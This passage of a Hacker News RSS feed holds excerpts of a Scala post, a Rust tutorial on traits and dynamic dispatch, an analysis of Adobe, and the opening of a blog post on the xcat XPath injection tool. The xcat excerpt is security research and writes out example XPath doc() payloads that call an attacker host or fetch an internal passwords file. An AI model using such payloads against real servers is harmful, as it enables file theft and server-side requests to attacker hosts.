Scala"></p></figure><p>‍</p><p>‍</p><p>‍</p><h2><strong>Statically typed</strong></h2><p>By checking the type during the compilation, Scala type system reduces considerably the amount of bugs caused by type errors.</p><p>Type inference allows typing without being too verbose:</p><p>def square(x: Int) = x * x&nbsp;</p><p>Here the type of square (Int) is inferred from the * operator which multiplies an Int by an Int giving an Int in output.</p><p>And thanks to pattern matching, we can still write flexible code:</p><figure id="w-node-5d4c922f320c-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df82d19cead6575ed2edd_20201019%20Scala%20Article_5.png" loading="lazy" alt="How to decompose an object to pattern match on its attributes, add pattern guards, pattern match a regex or the elements of a List in Scala"></p></figure><p>Here we can even decompose an object to pattern match on its attributes. We can even add pattern guards (if condition in a case), pattern match a regex or the elements of a List.</p><p>‍</p><h2><strong>Clean error management by design</strong></h2><h3><strong>Option and Either</strong></h3><p>There are some useful standard types in Scala to manage errors. The most commonly used are Option and Either. An Option can either be a class Some containing a value or a None object. So we can associate a valid result to Some and an error to None. Let's write a function to safely update a String to Int.</p><figure id="w-node-60c03b54f3c2-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df92687207e98effd9699_20201019%20Scala%20Article_6.png" loading="lazy" alt="How to to safely update a String to Int in Scala"></p></figure><p>‍</p><p>And if we need an error message we can use the Either class that will return a Right containing the value or a Left with an error type.</p><figure id="w-node-b021a222808e-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8dfb98068c68637d53699d_20201019%20Scala%20Article_7.png" loading="lazy" alt="If we need an error message we can use the Either class that will return a Right containing the value or a Left with an error type in Scala"></p></figure><p>‍</p><p>Try is also a great type to manage error, especially to encapsulate every call to Java functions that can throw errors.</p><p>‍</p><h3><strong>Combine them with for-comprehension</strong></h3><p>Option, Either or Try allow us to return a result or an error and not throw it to whatever will catch it. And thanks to a special Scala control structure, the “for-comprehension”, we can easily combine them to return the first error encountered.</p><figure id="w-node-c336c52f22b2-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8df9f519cead4e10ed589d_20201019%20Scala%20Article_8.png" loading="lazy" alt="The Scala control structure “for-comprehension” allows to easily combine Option, Either and Try to return the first error encountered."></p></figure><p>dividend on the left part of dividend &lt;- convertStringToInt(dividendStr) is the value in the Right of the convertStringToInt(dividendStr) result. If convertStringToInt(dividendStr) returns an error, it will stop immediately and return that error in a Left for safeStringDivision.</p><p>‍</p><h3><strong>Perfect to handle asynchronous code</strong></h3><p>“for-comprehension” are also amazing to work with asynchronous code like HTTP calls encapsulated in a Future. We can combine them and return an error for the first error we encounter.</p><figure id="w-node-6dcad4d139cc-d0a68507"><p><img src="https://uploads-ssl.webflow.com/5de53075747d4101db8251cb/5f8dfab1a0c47639e33ad40f_20201019%20Scala%20Article_9.png" loading="lazy" alt="In Scala, for-comprehension are also amazing to work with asynchronous code like HTTP calls encapsulate in a Future."></p></figure><p>‍</p><p>We can even combine Future with other error types like Either by using functional libraries like <a href="https://typelevel.org/cats/datatypes/eithert.html" target="_blank">cats</a>.</p><p>‍</p><p>‍</p><p>‍</p><h2><strong>JVM allows to use powerful java libraries</strong></h2><p>For example we use db connectors, libraries to manage timestamps, logging &amp; monitoring clients and more!</p><p>‍</p><h2><strong>Good tooling environment</strong></h2><p>There is a great IDE with Intellij Idea. The community also built a very efficient alternative Metals, a plugin that can transform your VS Code in Scala IDE.</p><p>Another useful tool we use is sbt-docker. It allows you to simply build a docker container embedding your application.</p><p>‍</p><p>Such powerful language attracts skilled engineers who are curious and keen to test new tools, who have the willingness to discover new paradigms, new perspectives to see the world of programming... And this is the perfect mindset to join a startup as Engineer 1 to 10!</p><p>By the way, <a href="https://angel.co/company/actiondesk/jobs" target="_blank">we’re hiring</a> if you want to join us at <a href="http://actiondesk.io/" target="_blank">Actiondesk</a>.</p><p>‍</p></div></div></div>]]>
            </description>
            <link>https://www.actiondesk.io/blog/why-use-scala</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945145</guid>
            <pubDate>Fri, 30 Oct 2020 18:07:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[So you want to write object oriented Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945038">thread link</a>) | @lukastyrychtr
<br/>
October 30, 2020 | https://blog.darrien.dev/posts/so-you-want-to-object/ | <a href="https://web.archive.org/web/*/https://blog.darrien.dev/posts/so-you-want-to-object/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
        <p>Whether you wanted to find out about object oriented Rust yourself, or you
wanted to see why in the world I’m talking about object oriented rust, you are
here. And so let us talk about object oriented Rust.</p>
<p>Object oriented Rust is not so outlandish. Many folks think of Rust as a
functional language, and while there are plenty of functional paradigms in Rust,
many of those paradigms are also available to other languages in one way or
another.</p>
<p>Most folks would not call Java a functional language, and yet many of the
features cited that make Rust a functional language are available as libraries
for Java. If you want algebraic data types, <a href="https://github.com/HubSpot/algebra">there’s a library for
that</a>. If you want pattern matching,
<a href="https://github.com/derive4j/derive4%5D">there’s a library for that too</a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p>The absence or presence of such features does not make a language object
oriented or functional, there are plenty of ways to stamp features from one
langauge onto others.</p>
<p>With that said, given Rust is intended to be a functional replacement to C++,
plenty of object oriented features exist in Rust. You don’t have to leave the
standard library to access them either!</p>
<p>Because of many of the restrictions and lack of a GC in Rust, there are a number
of nuances with how Rust handles OOP. It can certainly work like Java if you
really want it to, but sometimes it can take a little finagling.</p>
<p>The remainder of this post will talk about OOP in the context of Rust itself,
and common pitfalls you may hit along the way while writing object oriented Rust
or using object oriented patterns.</p>
<hr>
<p>Anyway enough talk, let’s write some Rust. Rust has a concept of traits, which
<a href="https://blog.rust-lang.org/2015/05/11/traits.html#traits-are-interfaces">are the Java equivalent of
interfaces</a><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.
They define a common set of methods to be used across object types. Let’s throw
together some traits.</p>
<div><pre><code data-lang="rust"><span>trait</span> Worker {
    <span>fn</span> <span>receive_pay</span>(<span>&amp;</span>self) -&gt; <span>u32</span>;
}

<span>trait</span> SoftwareEngineer: <span>Worker</span> {
    <span>fn</span> <span>write_code</span>(<span>&amp;</span>self) -&gt; String;
}

<span>trait</span> Astronaut: <span>Worker</span> {
    <span>fn</span> <span>see_the_moon</span>(<span>&amp;</span>self);
}
</code></pre></div><p>These two traits are friends. SoftwareEngineer is a
<a href="https://doc.rust-lang.org/rust-by-example/trait/supertraits.html">SuperTrait</a>
that encapsulates the functionality of Worker. Implementors must also implement
worker if they would like to implement SoftwareEngineer. So far this looks like
piecemeal composition. Nothing exciting yet.</p>
<p>Let’s get some implementors.</p>
<p>First we are making some structs to hold traits for the implementors.</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>RustDev</span> {
    balance: <span>i32</span>,
}

<span>struct</span> <span>NasaWorker</span> {
    balance: <span>i32</span>,
}
</code></pre></div><p>And then we implement the above traits on them:</p>
<div><pre><code data-lang="rust"><span>impl</span> Worker <span>for</span> RustDev {
    <span>fn</span> <span>receive_pay</span>(<span>&amp;</span><span>mut</span> self) -&gt; <span>i32</span> {
        self.balance <span>+=</span> <span>50000</span>;
        self.balance
    }
}

<span>impl</span> SoftwareEngineer <span>for</span> RustDev {
    <span>fn</span> <span>write_code</span>(<span>&amp;</span>self) -&gt; String {
        <span>r#"panic!("At the software-co")"#</span>.to_owned()
    }
}

<span>impl</span> Worker <span>for</span> NasaWorker {
    <span>fn</span> <span>receive_pay</span>(<span>&amp;</span><span>mut</span> self) -&gt; <span>i32</span> {
        self.balance <span>+=</span> <span>1000000</span>;
        self.balance
    }
}

<span>impl</span> Astronaut <span>for</span> NasaWorker {
    <span>fn</span> <span>see_the_moon</span>(<span>&amp;</span>self) {
        println<span>!</span>(<span>"wow that's cool"</span>);
    }
}
</code></pre></div><p>Still nothing exciting here. So let’s change that a little. Now I want to start
using these types and we can really start leveraging our traits.</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> engineer <span>=</span> RustDev { balance: <span>0</span> };
    <span>let</span> astronaut <span>=</span> NasaWorker { balance: <span>0</span> };
    println<span>!</span>(<span>"Engineer's balance: {}"</span>, pay_worker(engineer));
    println<span>!</span>(<span>"Astronaut's balance: {}"</span>, pay_worker(astronaut));
}

<span>fn</span> <span>get_astronaut</span>() -&gt; <span>impl</span> Astronaut {
    NasaWorker { balance: <span>0</span> }
}

<span>fn</span> <span>get_engineer</span>() -&gt; <span>impl</span> SoftwareEngineer {
    RustDev { balance: <span>0</span> }
}

<span>fn</span> <span>pay_worker</span>(<span>mut</span> worker: <span>impl</span> Worker) -&gt; <span>i32</span> {
    worker.receive_pay()
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
$ ./trait-test
Engineer<span>'s balance: 50000
</span><span>Astronaut'</span>s balance: <span>1000000</span>
</code></pre></div><p>You can see we are generic over Worker and receive pay on both of them. Despite
not needing it, you’ll note I made the <code>pay_worker</code> method take ownership of the
<code>Worker</code> argument. It doesn’t even use a reference.</p>
<p>This is the simplest and fastest way to pass generic objects around. It doesn’t
use dynamic dispatch. Rust knows ahead of time what your type is and just calls
the method.</p>
<p>Anyway let’s keep going with the examples. I want to get a bunch of these
workers, put them in a collection, and give them all pay.</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> astronaut <span>=</span> get_astronaut();
    <span>let</span> engineer <span>=</span> get_engineer();
    give_em_pay(vec<span>!</span>[astronaut, engineer]);
}

<span>fn</span> <span>give_em_pay</span>(<span>mut</span> workers: Vec<span>&lt;</span><span>impl</span> Worker<span>&gt;</span>) {
    workers.iter_mut().for_each(<span>|</span>worker<span>|</span> {
        worker.receive_pay();
    });
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs 
error<span>[</span>E0308<span>]</span>: mismatched types
  --&gt; trait-test.rs:50:33
   |
<span>50</span> |     give_em_pay<span>(</span>vec!<span>[</span>astronaut, engineer<span>])</span>;
   |                                 ^^^^^^^^ expected opaque type, found a different opaque type
...
<span>63</span> | fn get_engineer<span>()</span> -&gt; impl Worker <span>{</span>
   |                      ----------- the found opaque type
   |
   <span>=</span> note:     expected type <span>`</span>impl Worker<span>`</span> <span>(</span>opaque type at &lt;trait-test.rs:59:23&gt;<span>)</span>
           found opaque type <span>`</span>impl Worker<span>`</span> <span>(</span>opaque type at &lt;trait-test.rs:63:22&gt;<span>)</span>
   <span>=</span> note: distinct uses of <span>`</span>impl Trait<span>`</span> result in different opaque types

error: aborting due to previous error

For more information about this error, try <span>`</span>rustc --explain E0308<span>`</span>.
</code></pre></div><p>Well that’s interesting. Everything implements Worker, but it’s just not
allowed. Even more interesting, if you replace the two SoftwareEngineer +
Astronaut with just Astronaut, it works!</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> astronaut1 <span>=</span> get_astronaut();
    <span>let</span> astronaut2 <span>=</span> get_astronaut();
    give_em_pay(vec<span>!</span>[astronaut1, astronaut2]);
    println<span>!</span>(<span>"The workers are paid!"</span>);
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
warning: <span>function</span> is never used: <span>`</span>get_engineer<span>`</span>
...

$ ./trait-test
The workers are paid!
</code></pre></div><p>That’s because static dispatch doesn’t allow for collections of implementors
unless the implementors are all the same. All <code>impl Trait</code>s must eventually
compile down to the same type, meaning there is no way to carry a collection of
traits using static dispatch if they compile to different implementations.</p>
<p>This is one of the most frustrating behaviors of static dispatch, as it makes it
very difficult to pass ownership of objects around in a generic way. If you need
ownership of said objects in a collection, you’ll need to use dynamic dispatch.</p>
<h2 id="dynamic-dispatch-you-say">Dynamic dispatch you say?<a href="#dynamic-dispatch-you-say" arialabel="Anchor">⌗</a> </h2>
<p>Yes, dynamic dispatch. Smarter folks have described it than me, so here is one
of their definitions.</p>
<p>Copied shamelessly from
<a href="https://en.wikipedia.org/wiki/Dynamic_dispatch">Wikipedia</a>:</p>
<blockquote>
<p>In computer science, dynamic dispatch is the process of selecting which
implementation of a polymorphic operation (method or function) to call at run
time. It is commonly employed in, and considered a prime characteristic of,
object-oriented programming (OOP) languages and systems.</p>
</blockquote>
<p>In short, the way dynamic dispatch works is:</p>
<ol>
<li>Have a pointer to an object</li>
<li>Carry a vtable with a set of pointers to that object’s implementation of
methods.</li>
<li>Figure out which to call at runtime through this indirection</li>
</ol>
<p>This indirection has a cost. It’s all figured out at runtime which makes it a
little slower. However we get vastly increased flexibility with dynamic
dispatch.</p>
<h2 id="so-how-does-it-work-with-rust">So how does it work with Rust?<a href="#so-how-does-it-work-with-rust" arialabel="Anchor">⌗</a> </h2>
<p>The TL/DR is we have to throw our data behind a pointer. Heap or stack
allocated, method calls must be behind a pointer to the trait, and rustc will
figure out what to do from there.</p>
<p>Let’s change up our example a little:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> <span>mut</span> astronaut <span>=</span> get_astronaut();
    <span>let</span> <span>mut</span> engineer <span>=</span> get_engineer();

    give_em_pay(vec<span>!</span>[<span>&amp;</span><span>mut</span> astronaut, <span>&amp;</span><span>mut</span> engineer]);
    println<span>!</span>(<span>"The workers are paid!"</span>);
}

<span>// notice the dyn  ------------------∨
</span><span></span><span>fn</span> <span>give_em_pay</span>(<span>mut</span> workers: Vec<span>&lt;&amp;</span><span>mut</span> dyn Worker<span>&gt;</span>) {
    workers.iter_mut().for_each(<span>|</span>worker<span>|</span> {
        worker.receive_pay();
    });
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
$ ./trait-test
The workers are paid!
</code></pre></div><p>Run and no more compile errors! The only “real” change to the code was from
<code>impl</code> -&gt; <code>dyn</code> This has performance implications, but also opens up a world of
possibilities. For instance, you can see we now have an engineer and an
astronaut in the same array now.</p>
<p>We’re still using references here, but if we wrapped our astronaut and engineer
in a Box, we would own them in the vec. Nice!</p>
<h2 id="holding-traits">Holding traits<a href="#holding-traits" arialabel="Anchor">⌗</a> </h2>
<p>No not like a hug, but in a struct. Let’s try it out real quick. Does this work?</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>WorkerHolder</span> {
    worker: <span>impl</span> Worker,
}
</code></pre></div><div><pre><code data-lang="sh">$ rustc trait-test.rs
error<span>[</span>E0562<span>]</span>: <span>`</span>impl Trait<span>`</span> not allowed outside of <span>function</span> and inherent method <span>return</span> types
  --&gt; trait-test.rs:48:13
   |
<span>48</span> |     worker: impl Worker,
   |             ^^^^^^^^^^^

error: aborting due to previous error
</code></pre></div><p>Well no. But that’s not because it doesn’t work. The error is a little
disingenuous.</p>
<p><code>impl</code> is syntactic sugar for a more verbose syntax that specifies data is
generic over a type. For some reason the <code>impl</code> syntactic sugar does not work
here. The proper syntax to make this work looks like so:</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>WorkerHolder</span><span>&lt;</span>T: <span>Worker</span><span>&gt;</span> {
    worker: <span>T</span>,
}
</code></pre></div><p>There isn’t much more excitement to talk about for static dispatch here, so
let’s move back to dynamic to discuss a few other quirks with it.</p>
<p>This is the proper syntax for holding a traits using dynamic dispatch:</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>ReferenceWorkerHolder</span><span>&lt;</span><span>'a</span><span>&gt;</span> {
    worker: <span>&amp;</span><span>'a</span> dyn Worker,
}

<span>struct</span> <span>BoxWorkerHolder</span> {
    worker: Box<span>&lt;</span>dyn Worker<span>&gt;</span>,
}
</code></pre></div><h2 id="owning-and-cloning">Owning and cloning<a href="#owning-and-cloning" arialabel="Anchor">⌗</a> </h2>
<p>Let’s take a closer look at the boxed implementation. I’d like to pass the
worker into a method that looks like this:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>do_crazy_stuff_with_worker</span>(worker: Box<span>&lt;</span>dyn Worker<span>&gt;</span>) {
    <span>// fly to mars or something, I dunno
</span><span></span>}
</code></pre></div><p>Let’s make an astronaut and do crazy stuff with him twice. This method wants an
instance of the astronaut, and so we comply.</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    <span>let</span> <span>mut</span> holder <span>=</span> BoxWorkerHolder {
        worker: Box::new(get_astronaut()),
    };
    
    do_crazy_stuff_with_worker(holder.worker);
    do_crazy_stuff_with_worker(holder.worker);
}
</code></pre></div><div><pre><code data-lang="sh">$ vim trait-test.rs
$ rustc trait-test.rs
error<span>[</span>E0382<span>]</span>: use of moved value: <span>`</span>holder.worker<span>`</span>
  --&gt; trait-test.rs:61:16
   |
<span>60</span> |     pay_worker<span>(</span>holder.worker<span>)</span>;
   |                ------------- value moved here
<span>61</span> |     pay_worker<span>(</span>holder.worker<span>)</span>;
   |                ^^^^^^^^^^^^^ value used here after move
   |
   <span>=</span> note: move occurs because <span>`</span>holder.worker<span>`</span> has type <span>`</span>std::boxed::Box&lt;dyn …</code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.darrien.dev/posts/so-you-want-to-object/">https://blog.darrien.dev/posts/so-you-want-to-object/</a></em></p>]]>
            </description>
            <link>https://blog.darrien.dev/posts/so-you-want-to-object/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945038</guid>
            <pubDate>Fri, 30 Oct 2020 17:59:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Evolution of Adobe and Future of Creative Software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944961">thread link</a>) | @yarapavan
<br/>
October 30, 2020 | https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software | <a href="https://web.archive.org/web/*/https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" role="group"><div><div><h3><em>By <a href="https://www.linkedin.com/in/meha-patel/">Meha Patel</a> and <a href="https://www.linkedin.com/in/nnamdiokike/">Nnamdi Okike</a></em></h3><hr><p><img alt="mark-cruz-VW2oU66mwbc-unsplash" src="https://images.ctfassets.net/clfay1lxzjey/4Kivkm0e0GJ1RL4PmWU3qG/5856ffca944fe78f0164a9bb467dbffb/mark-cruz-VW2oU66mwbc-unsplash.jpg"></p><hr><p>Over the past 38 years, Adobe has built itself into a ~$245 billion market cap company by introducing and then dominating a new category: creative software. Over the next decade and beyond, we see this market evolving and enabling the emergence of multiple billion dollar startups that build upon Adobe’s foundation. These include several companies already well on their way such as Canva, Figma, and others. </p><p>In this article, we: i) introduce a framework for evaluating Adobe as a platform company; ii) analyze Adobe’s history and the factors that enabled its rise, iii) describe the technology &amp; behavioral waves catalyzing innovation, and iv) suggest areas of opportunity for emerging startups. More specifically, we highlight video workflows, analytics capabilities, and document alternatives as 3 key areas of opportunity, and also link a growing <a href="https://airtable.com/invite/l?inviteId=invL8RfK15a1yqHG1&amp;inviteToken=752ceb35a51bae83e02f6f454798d979e147d6f162b3bb3ad10ca0bc0b95a15c">repository</a> of startups in various creative software categories. Please feel free to read the entire article, or skip to the section(s) that are most interesting to you.</p><hr><h2>I. Introduction</h2><hr><p>Over the past few years, much attention has been paid to the “unbundling” of companies including eBay, Craigslist, and Linkedin. The basis of the unbundling concept is that while the aggregation of multiple products and services initially results in network effects and scale economies in the first wave of a technology market, it also limits personalization, customization, and quality of experience. This creates an opportunity for new startups to displace the incumbent by providing more customized solutions as the market matures.</p><p>While the unbundling approach has worked well for startups attacking certain incumbents, it has limitations as a framework. This is particularly true for platform companies upon which new startups rely on in order to successfully build and distribute products. In these markets, innovation takes a more layered approach, with newer companies building upon a foundation laid by an incumbent. Rather than unbundling, we call this <em>an evolution</em> of a platform, and we believe that this is the best framework for evaluating Adobe, its innovation track record, and the startups innovating in this market today. </p><p>In comparison to better-known software giants in Silicon Valley, Adobe has flourished relatively quietly for much of its 38-year history. What began as a small publishing software company has now expanded into a conglomerate providing an extensive suite of products across its Creative, Document, and Experience Clouds. Today, Adobe employs over 22,000 employees and generates over $11 billion in revenue annually, with a market capitalization of ~$245 billion. <a href="">1</a></p><p>Along the way, it has made numerous transformative acquisitions, including Macromedia ($3.4 billion), Omniture ($1.8 billion), and Marketo ($4.8 billion). Its acquisition of Behance ($150 million) also enabled it to build the leading online platform to showcase and discover creative work. It has also successfully expanded into new pockets of creative software, which eventually yielded large business lines. Adobe’s ability to consistently innovate through organic and inorganic growth, while successfully transitioning leadership between different CEOs over multiple decades, is one of the tech industry’s great overlooked stories. The company’s Creative Cloud launch and move to a subscription-based pricing model at the end of 2013 precipitated a quadrupling of its market cap since that time. <a href="">2</a></p><p><img alt="Screen Shot 2020-10-14 at 12.09.42 PM" src="https://images.ctfassets.net/clfay1lxzjey/7nSKcMyD30evkeX4plmIQa/b0fb3bc9358b4724e76df9b2ae2b20bc/Screen_Shot_2020-10-14_at_12.09.42_PM.png"></p><blockquote><blockquote><p><strong><em>Adobe’s Stock Price Has Skyrocketed over the Past Two Decades</em></strong></p></blockquote></blockquote><p>As we explain below, we believe Adobe is entering a new phase, where new startups are building upon its platform and legacy. The growth of this new generation of startups is driven by technological and behavioral inflections. Rather than replace Adobe’s products, these startups are innovating  upon Adobe’s foundation to build a new generation of creative software. </p><hr><h2>II. The Growth of Adobe and its Significance</h2><hr><p>Adobe was founded by Chuck Geschke and John Warnock (above) to enable more accessible publishing and printing software.Throughout its first decade, Adobe aggressively targeted designers and creative professionals, creating new categories of software across graphics, photo, video, and publishing. Along with Apple, Adobe helped bring about the desktop publishing revolution, launching products such as Illustrator, Photoshop, and Acrobat. Over the past two decades, Adobe then made several transformative acquisitions, enabling it to expand into web-based products (Macromedia), enterprise analytics (Omniture), e-commerce software (Magento), and marketing automation software (Marketo). </p><p>We believe that Adobe’s success has been driven largely by the following three characteristics:</p><p>1) <strong>Successful Partnerships:</strong> From the very beginning, Adobe has secured successful partnerships through a thoughtful and strategic approach to choosing the right partners. Adobe’s first product, PostScript, was a page description language, which allowed users to print to external printers. Adobe understood that the proliferation of its software was dependent on high-quality hardware, and it strategically chose to partner with the best hardware company for creative users, Apple. In 1985, Apple debuted the LaserWriter printer with Postscript, and it was the first printer to use the language. Combined with a third partnership with Aldus Software, the trio established the desktop publishing revolution, and elevated Adobe’s positioning within the corporate ecosystem. Taking this further, Adobe capitalized on this position and cultivated deep partnerships with other large technology companies, such as IBM and Microsoft, ensuring it is deeply entrenched as the defacto creative software suite. </p><p>2) <strong>Ability to Bundle Products:</strong> Adobe has consistently been able to bundle its products into an integrated suite, while ensuring that value was strong enough for customers to pay a premium price for the bundle. In its early years, Adobe quickly amassed a wide variety of capabilities and was able to bundle new offerings with existing products to accelerate adoption. The company understood that the customer of that time wasn’t seeking point solutions, and instead wanted an integrated software solution that could solve multiple needs. Adobe has built on this strategy over time, culminating in the launch of its full product suite in 2003. What has been most unique about Adobe’s bundling approach is its ability to charge premium prices for the full subscription offering. For example, Adobe’s Creative Cloud offering is currently $80 per month for the base business license, or almost $1k per year. Adobe has an estimated 15 million paying subscribers today, evidencing the power of its integrated suite and the fact that Adobe is the standard. The network effects of Adobe’s products also enhance its lock-in. </p><p>3) <strong>Successful Acquisitions:</strong> Throughout its tenure, Adobe strategically selected acquisitions to enter into new markets, often choosing to buy versus build, and then subsequently successfully integrated those acquisitions. Adobe’s acquisition strategy is differentiated due to the fact that the company is not afraid to make large, bold bets, at same time dedicating the time and resources over a long period to ensure that these bets pay off. For example, Adobe’s $1.8 billion acquisition of Omniture in 2009 was seemingly off strategy and non-complementary. Why was a creative/design software company making such a large bet to acquire the leading player in enterprise analytics? Adobe understood that the future of marketing was uniting content creation with marketing analytics. Disciplines that were historically the purview of different enterprise departments would merge, and the rise of web/mobile analytics would enable a much tighter feedback loop within content creation and design. More than ten years later, the deal is seen as a brilliant strategic move that enabled Adobe to build its Experience Cloud.</p><p><img alt="Screen Shot 2020-10-14 at 12.14.59 PM" src="https://images.ctfassets.net/clfay1lxzjey/4E8RcynEAKHogL4YZDJccI/ebebfd21f11b47ddbe794c2778afa757/Screen_Shot_2020-10-14_at_12.14.59_PM.png"></p><blockquote><blockquote><p><strong><em>Adobe Has Made Several Successful Acquisitions over the Past Two Decades</em></strong></p></blockquote></blockquote><p>4) <strong>Transition to Cloud-based Company:</strong> In 2012, Adobe released Creative Cloud and fundamentally changed the way its products were offered, updated, and priced. While risky at the time, it enabled Adobe to transform the types of users they targeted and more importantly, stay relevant as more cloud-based competitors emerged. Growth in subscriptions for the Creative Cloud over the two years following launch can be seen below.</p><p><img alt="Screen Shot 2020-10-14 at 12.17.42 PM" src="https://images.ctfassets.net/clfay1lxzjey/16qjRVLN4x3x0fpmLeZHeB/18dbd03bacb9f8e0bbdfd8937dbbbd01/updated_chart.jpg"></p><p>How did Adobe accomplish its transition to becoming a cloud company, and why did they succeed where many large companies have stumbled? They succeeded through a series of strategic moves led by CEO Shantanu Narayen. These included the acquisition of Omniture, which enabled Adobe to immediately become the leader in enterprise cloud analytics. It also included the $150m acquisition of Behance, which provided the company with a large community of designers who desired to showcase creative work. By 2018, Behance had over 10 million users, 10x the number when it was acquired by Adobe.</p><p>Adobe was also willing to absorb the financial impact of switching from a one-time license of ~$1800 to a per-month subscription of $50 for its Creative Cloud software, which results in an initial revenue shortfall. Adobe did this over five years, first introducing Creative Cloud in April 2012, and not retiring its license option until January 2017.</p><p>Finally, Adobe displayed pragmatism in listening to the market where its products were not well-received. By far the most notable example was Adobe Flash. In 2010, Steve Jobs posted his letter “Thoughts on Flash,” which criticized Flash and stated why Flash would not be allowed on iPhone, iPod Touch and iPad. While Adobe’s CEO Narayen initially fired back at Jobs, Adobe eventually decided to discontinue Flash and focus resources on HTML5. Through this move, Adobe displayed pragmatism, realizing that there was more money in building and acquiring SaaS apps than supporting media software on hardware …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software">https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software</a></em></p>]]>
            </description>
            <link>https://645ventures.com/the-evolution-of-adobe-and-future-of-creative-software</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944961</guid>
            <pubDate>Fri, 30 Oct 2020 17:53:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XPath injection issues are severely underrated]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24944846">thread link</a>) | @fanf2
<br/>
October 30, 2020 | https://tomforb.es/xcat-1.0-released-or-xpath-injection-issues-are-severely-underrated/ | <a href="https://web.archive.org/web/*/https://tomforb.es/xcat-1.0-released-or-xpath-injection-issues-are-severely-underrated/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p>I’ve just released <a href="https://github.com/orf/xcat" target="_blank">xcat 1.0</a>
and it’s
<a href="https://github.com/orf/xcat_app" target="_blank">demonstration application</a>
after like 5 years of on-off development. Feels good!</p><p>The genesis of xcat was when my boss, Sid, walked up to me out of the blue and asked if I wanted to go on an all
expenses paid trip to Amsterdam. Who the hell wouldn’t say yes to that proposition? <em>“Great! you’ve got a month to write
a research paper on XPath injection flaws and we will present it at Blackhat Europe”</em>. Wait… slow down! What’s XPath?!</p><p>As it turns out XPath is what you get when you combine the unholy trinity of <strong>XML</strong>, <strong>design-by-committee</strong> and
<strong>large quantities of drugs</strong>. But before I get into that here’s a short demo of me listing directories, reading
arbitrary files and dumping environment variables through a simple innocuous XPath injection flaw, using <code>xcat</code>:</p><center></center><p><em>I recommend reading a little bit about what XPath is and a little bit about blind injection vulnerabilities.
I wrote <a href="https://tomforb.es/exploiting-xpath-injection-vulnerabilities-with-xcat/">an introduction here</a>
or there
is the venerable <a href="https://www.owasp.org/index.php/XPATH_Injection" target="_blank">OWASP page on the topic</a>
.</em></p><h2 id="xpath-10">XPath 1.0</h2><p>So, back to large quantities of drugs. The year was 1999. Intel had just released the 800 MHZ Pentium III, Internet
Explorer 5.0 was the hot new browser and XML was all the rage.</p><p>All was not well in the land of XML though: parsing, filtering and generally using it was a huge pain. So some clever
people invented a nice, clean and concise syntax for querying it documents without any hassle:</p><p><code>//Employee[UserName/text()='tom']</code></p><p>Cool! This seems a lot simpler and more flexible than whatever manual parsing/iteration you’d come up with
in <code>$FAVORITE_LANGUAGE</code>. And this was XPath, the people rejoiced and the world was good.</p><p>Until 2010.</p><h2 id="xpath-20">XPath 2.0</h2><p>It was decided in 2010 that XPath 1.0 was too simple. What it clearly, <em>clearly</em> lacked was a weird type system
(it’s both strongly and weakly typed), a <a href="https://upload.wikimedia.org/wikipedia/commons/9/91/XQuery_and_XPath_Data_Model_type_hierarchy.png" target="_blank">greatly expanded type heirachy</a>
(seriously go look at that), <code>isinstance</code> checks, casting and a much larger function library.</p><p>Now don’t get me wrong: some of these are good changes. But what snuck into this version is the
<a href="https://maxtoroq.github.io/xpath-ref/fn/doc.html" target="_blank">fairly innocuous doc function</a>
. Seems simple - you can reference
external XML files in your query (almost like a join) and I’m sure there are use cases for this.</p><p>This function jumped right out at me when I was struggling
<a href="https://www.w3.org/TR/xpath20/" target="_blank">through the very, very dense XPath specification</a>
, wondering if I should just buy my
own bloody holiday to Amsterdam. What does <code>doc('https://attacker.com/xxe.xml')</code> do? Or
<code>doc('ftp://internalserver/passwords.xml')</code>? Or, heck, even <code>doc('gopher://server/something')</code>?</p><p>Turns out it does what you would expect. It makes the request. So now if you find an exploitable XPath injection flaw
